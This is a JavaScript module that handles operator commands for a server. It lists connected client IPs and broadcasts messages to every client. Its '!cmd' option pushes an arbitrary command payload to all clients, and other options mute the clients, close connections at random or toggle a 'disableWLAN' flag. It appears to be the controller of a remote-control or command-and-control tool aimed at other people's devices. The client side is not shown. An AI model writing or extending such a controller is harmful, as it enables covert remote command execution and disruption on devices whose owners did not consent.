const {Server} = require('./server');
const {Message} = require('./msg');
/**
 *
 * @param {string[]} data
 */
function CMD(data) {
  const command = data.slice(1).join(' ');
  Server.broadcast(JSON.stringify(Message.new("cmd", command)))
  return {
    ok: true,
    type: "broadcast",
    message: `Sent cmd payload: ${command}`,
  };
}

function mute() {
  Server.broadcast(JSON.stringify(Message.new("mute", null)));
  return {
    ok: true,
    type: "broadcast",
    message: "Sent mute command",
  };
}


function list() {
  const clients = [];
  console.log(`Found ${Server.clients.size} clients connected: `);
  Server.clients.forEach((client) => {
    console.log(`Client ${client.ip}`);
    clients.push(client.ip);
  })
  return clients;
}

function sleep(delay) {
    var start = (new Date()).getTime();
    while((new Date()).getTime() - start < delay) {
        continue;
    }
}


function kmute() {
  for(var i = 0; i < 3; i++) {
    sleep(1000);
    console.log(i);
    Server.broadcast("mute") 
  }
  return {
    ok: true,
    type: "broadcast",
    message: "Sent raw mute 3 times",
  };
}
  
/**
 * 
 * @param {String} msg 
 */
function processCommand(msg) {
  msg = msg.trim();
  if (msg.length === 0) {
    return {
      ok: false,
      type: "invalid",
      message: "Empty command",
    };
  }

  if (msg.startsWith("!")) {
    const data = msg.split(" ");
    const method = data[0]
    switch (method) {
      case "!ls":
        return {
          ok: true,
          type: "server",
          message: "Listed online devices",
          data: {
            clients: list(),
          },
        };
      case "!kmute":
        return kmute();
      case "!rc":
        Server.randomClose = !Server.randomClose;
        console.log(Server.randomClose)
        return {
          ok: true,
          type: "server",
          message: `randomClose=${Server.randomClose}`,
        };
      case "!dw":
        Server.disableWLAN= !Server.disableWLAN;
        console.log(Server.disableWLAN)
        return {
          ok: true,
          type: "server",
          message: `disableWLAN=${Server.disableWLAN}`,
        };
      case "!cmd":
        return CMD(data);
      case "!mute":
        return mute();
      default:
        console.log(`Can't resolve server command: ${method}`);
        return {
          ok: false,
          type: "server",
          message: `Can't resolve server command: ${method}`,
        };
    }
  }
  else {
    Server.broadcast(msg);
    return {
      ok: true,
      type: "broadcast",
      message: `Broadcasted raw message: ${msg}`,
    };
  }
}

module.exports = {
  processCommand,
}
